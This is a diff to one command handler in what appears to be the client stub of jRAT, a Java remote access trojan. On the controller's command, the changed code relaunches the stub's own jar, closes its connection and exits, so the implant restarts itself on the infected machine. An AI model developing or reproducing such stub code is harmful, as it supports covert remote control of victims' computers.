@@ -1,33 +1,29 @@
 package se.jrat.stub.packets.incoming;
 
+import java.io.File;
+
+import se.jrat.common.downloadable.JavaArchive;
 import se.jrat.stub.Connection;
 import se.jrat.stub.utils.Utils;
-
-import com.redpois0n.oslib.OperatingSystem;
 
 public class Packet37RestartJavaProcess extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		try {
+		File file = new File(Utils.getJarFile().getAbsolutePath());
 
-			Connection.instance.getSocket().close();
-		} catch (Exception ex) {
+		if (file.isFile()) {
+			JavaArchive jar = new JavaArchive();
+			jar.execute(file);
+			
+			try {
+				Connection.instance.getSocket().close();
+			} catch (Exception ex) {
+				
+			}
+			
+			System.exit(0);
 		}
-		String javapath = System.getProperty("java.home");
-
-		String path = Utils.getJarFile().getAbsolutePath();
-
-		if (path.startsWith("/") && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-			path = path.substring(1, path.length());
-		}
-
-		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-			Runtime.getRuntime().exec(new String[] { javapath + "\\bin\\javaw.exe", "-jar", path });
-		} else {
-			Runtime.getRuntime().exec(new String[] { "java", "-jar", path });
-		}
-		System.exit(0);
 	}
 
 }
